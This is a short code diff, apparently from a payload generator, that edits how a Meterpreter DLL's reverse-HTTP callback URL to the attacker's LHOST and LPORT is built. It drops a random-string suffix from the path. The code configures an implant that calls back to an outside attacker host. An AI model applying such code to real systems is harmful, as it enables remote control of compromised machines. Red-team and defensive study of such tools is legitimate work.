@@ -47,7 +47,7 @@ class Payload:
         meterpreterDll = patch.patchTransport(meterpreterDll, False)
 
         # replace the URL
-        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + helpers.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
+        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + helpers.genHTTPChecksum() + "/\x00"
         meterpreterDll = patch.patchURL(meterpreterDll, urlString)
         
         # replace in the UA
